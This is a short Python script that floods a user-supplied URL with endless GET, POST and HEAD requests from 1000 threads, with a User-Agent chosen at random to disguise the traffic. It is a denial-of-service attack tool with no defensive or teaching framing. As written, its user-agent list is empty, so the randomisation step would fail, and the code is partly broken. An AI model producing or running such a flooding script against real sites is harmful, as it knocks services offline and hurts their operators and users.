import requests
from  threading import Thread
import random

users = [

]
headers ={
    'User-Agent' : random.choice(users)
}
url = input('url: ')
def send():
    while True:
        requests.get(url, headers=headers)
        print("Get...")
        requests.post(url, headers=headers)
        print("Post...")
        requests.head(url, headers=headers)
        print("Head...")

if __name__ == '__main__':
    for i in range(1000):
        thr = Thread(target=send)
        thr.start()
